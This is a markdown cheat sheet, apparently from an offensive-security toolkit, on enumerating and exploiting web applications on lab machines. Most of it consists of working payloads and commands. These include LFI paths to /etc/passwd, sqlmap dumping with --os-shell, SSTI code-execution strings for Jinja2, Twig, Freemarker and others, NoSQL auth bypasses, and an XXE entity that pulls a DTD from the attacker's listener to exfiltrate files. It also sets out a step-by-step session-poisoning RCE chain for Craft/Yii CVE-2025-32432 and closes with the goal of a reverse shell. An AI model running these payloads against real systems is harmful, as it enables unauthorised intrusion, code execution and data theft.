# Web enumeration and exploitation

Web is the foothold on the majority of lab machines. Do the manual read *and*
the fuzzing — the intended path is often a comment, a stale link, or a login
form's error-message difference, none of which a fuzzer surfaces.

## Manual read first (2 minutes, high yield)

```bash
pwnloop x "curl -sik http://machine.htb/ | head -60"
pwnloop x "whatweb -a3 http://machine.htb"
pwnloop x "curl -s http://machine.htb/robots.txt; curl -s http://machine.htb/sitemap.xml"
```

Look for: framework and version in headers/meta, developer comments, email
addresses (username seeds), JS files referencing API paths, upload forms, any
parameter that looks like a filename or a URL.

## Directory and file fuzzing

```bash
W=/usr/share/seclists/Discovery/Web-Content
pwnloop x "feroxbuster -u http://machine.htb -w $W/raft-medium-directories.txt \
       -x php,txt,html,bak,zip -t 50 -o /engagements/$NAME/scans/ferox-80.txt"
```

If the app is clearly PHP/ASPX/etc., set `-x` to that extension plus `bak`,
`old`, `txt`, `zip`. Filter noise by size or status once you see the pattern
(`-S <size>` / `-C 404,403`).

## Vhost fuzzing

```bash
pwnloop x "ffuf -u http://$T/ -H 'Host: FUZZ.machine.htb' \
       -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
       -fs <size-of-default-response> -o /engagements/$NAME/scans/vhost.json"
```

The `-fs` filter is mandatory — without it every response matches. Take the
size from an obviously-wrong host header first.

## Parameter fuzzing

```bash
pwnloop x "ffuf -u 'http://machine.htb/page.php?FUZZ=test' \
       -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size>"
```

## Vulnerability classes, in the order they usually appear on labs

**Local file inclusion** — any parameter taking a path or template name.
```
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php     # source disclosure
?page=/var/log/apache2/access.log                                # log poisoning → RCE
```
Source disclosure via the `php://filter` wrapper is the highest-value LFI
outcome: read `config.php`, `db.php`, `.env` and you usually have credentials.

**File upload** — check what the filter actually validates: extension, MIME,
magic bytes. Bypasses: `.phtml`, `.php5`, `.phar`, double extension,
`.htaccess` upload, null byte on old stacks, valid image header + PHP tail.
Then find where the file landed (fuzz `/uploads/`, `/images/`, the response).

**SQL injection** — test `'`, `"`, `\`, then order-by/union. Once confirmed, go
straight to `sqlmap` for extraction rather than hand-rolling:
```bash
pwnloop x "sqlmap -u 'http://machine.htb/x.php?id=1' --batch --dbs"
pwnloop x "sqlmap -u '...' --batch -D db -T users --dump"
pwnloop x "sqlmap -u '...' --batch --os-shell"     # when FILE privilege exists
```

**SSTI** — `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`. A rendered `49` means
RCE is usually one payload away (Jinja2, Twig, Freemarker, Velocity).

**Command injection** — parameters feeding ping/nslookup/convert/zip. Test
`;id`, `|id`, `$(id)`, `` `id` ``, `%0aid`. Blind: time-based (`;sleep 5`) or
out-of-band to your `tun0` listener.

**Deserialization** — PHP `unserialize` on a cookie, Java `rO0` base64, .NET
`ViewState`, Python pickle. Identify the magic bytes, then build a gadget.

**Auth bypass** — SQLi in login, default credentials, JWT `alg: none` or weak
HMAC secret (crack with `john`), IDOR on user IDs, password reset token
predictability, registration of an admin-named account.

**Known-CMS** — WordPress → `wpscan --url ... -e ap,at,u`. Anything else, get
the exact version and `searchsploit` it — then **also GitHub-search the CVE**
(`searchsploit` misses recent ones). Lab CMS installs are usually a single CVE
away from RCE. Fingerprint from headers/error pages (`X-Powered-By`), the admin
CP path, and cookie names even when the front page is a static template.

**Framework object-injection → include/`require` RCE.** When an endpoint builds
an object from user-supplied structure (Yii `createObject`, Symfony/Laravel
service definitions, Java/JS reflection), the win is instantiating a class whose
constructor/init does a file `include`/`require` or a `system` call. Method: find
the deserialization sink, read the framework's object-config rules (e.g. a
`__class` key often overrides the declared `class`, and the named `class` must be
a legal type for the slot or it won't attach), then point the gadget's file
argument at attacker-controlled content. *Example — Craft/Yii CVE-2025-32432:*
`POST actions/assets/generate-transform` with `handle[as x]` =
`{class: craft\behaviors\FieldLayoutBehavior, __class: yii\rbac\PhpManager,
__construct(){itemFile}}` → `PhpManager::init()`→`require(itemFile)`; CSRF from
`/actions/users/session-info`. Three traps that generalise to **any** blind
`require`/include RCE:
- **Output is blind** — the framework buffers/discards the include's output (the
  verbose error page is a `$_SESSION`/context dump, not your code's output).
  Prove exec with **side-effects only**: a `sleep` timing oracle, an HTTP/DNS
  callback, or a file write — never by grepping the response.
- **Get PHP into a readable file via session poisoning.** `GET
  ?p=admin/dashboard&a=<?=...?>` stores the payload as the session `__returnUrl`
  in `/var/lib/php/sessions/sess_<sid>`; then point `itemFile` there. The web
  server's own logs are often `root:adm` and unreadable by `www-data`, so
  log-poisoning fails where session-poisoning works.
- **Inject the raw `<?php`/`<?=` tag over a raw socket, not requests/curl** —
  HTTP clients percent-encode `<`/`>`, and a stored `%3C?php` never executes.
  Keep the stored payload space-free (`<?=` needs no trailing space; pass the
  command through a `$_GET` param read at trigger time).

**SSTI — confirm the engine before the payload.** `{{7*7}}`→49 is Jinja2/Twig;
`${7*7}`→49 is Freemarker/JSP-EL; `#{7*7}` is Ruby/Thymeleaf; `<%= 7*7 %>` is
ERB/EJS. Then:
```
Jinja2:     {{cycler.__init__.__globals__.os.popen('id').read()}}
Jinja2 alt: {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
Twig:       {{['id']|filter('system')}}    or  {{_self.env.registerUndefinedFilterCallback('system')}}
Freemarker: <#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
Velocity:   #set($e=$rt.getRuntime().exec("id"))
ERB:        <%= `id` %>
```

**NoSQL injection** (Mongo etc.) — auth bypass with operator injection:
```
POST body: {"user":{"$ne":null},"pass":{"$ne":null}}
query str: user[$ne]=x&pass[$ne]=x           # when the body is form-encoded
regex exfil: {"user":"admin","pass":{"$regex":"^a"}}   # boolean-blind, char by char
```

**XXE** — any XML sink (SOAP, SAML, DOCX/SVG/XML upload, REST accepting
`application/xml`):
```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
<!-- blind / OOB: pull an external DTD from your listener that exfils via a param entity -->
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://<tun0>/e.dtd"> %p;]>
```
PHP targets: `php://filter/convert.base64-encode/resource=index.php` as the
entity to read source. `jar:`/`netdoc:` on Java, `expect://` if the module is
present for RCE.

**Deserialization** — identify the format by its magic, then build a gadget:
| Stack | Signal | Tool |
|---|---|---|
| Java | `rO0AB` (base64) / `AC ED 00 05` | `ysoserial` (CommonsCollections, etc.) |
| PHP | `O:8:"…":` in a cookie/param | hand-craft, or `phpggc` |
| .NET | `ViewState`, `AAEAAAD` base64 | `ysoserial.net` (`TypeConfuseDelegate`) |
| Python | `pickle` bytes / `gASV` | craft `__reduce__` → `os.system` |
| Ruby | `Marshal` / `_json` | universal-gadget chains |
| Node | `_$$ND_FUNC$$_` / `node-serialize` | IIFE payload |

**Prototype pollution** (JS) — `?__proto__[isAdmin]=true`, or a JSON body with
`"__proto__":{"x":"y"}`. Escalates to RCE when a gadget downstream (template
engine option, `child_process` opts) reads the polluted property.

**HTTP request smuggling** — front/back disagree on body length. Probe CL.TE and
TE.CL with a timing differential; confirmed smuggling → prefix another user's
request, bypass front-end auth, or poison the socket. High-effort; only on boxes
with a visible proxy layer.

**Web cache poisoning / deception** — unkeyed header (`X-Forwarded-Host`,
`X-Forwarded-Scheme`) reflected into a cached response → serve your payload to
others; or trick the cache into storing an authenticated page under a static
path.

**CORS / CSRF** — `Access-Control-Allow-Origin` reflecting `Origin` with
`Allow-Credentials: true` → read authed responses cross-site. Missing/weak CSRF
token on a state-changing route → forge the request. Both matter when the box
has an admin-bot that visits URLs you supply.

**Client-side to server-side** — an XSS on a page an admin bot visits is a
credential/cookie theft or an authed-action primitive, not just an alert box.
Chain it to reach an admin-only route.

## After exploitation

Whatever the vector, aim for a reverse shell (see `references/foothold.md`) or
a credential. A web shell is fine as a stepping stone but upgrade quickly —
interactive access is where enumeration gets fast.
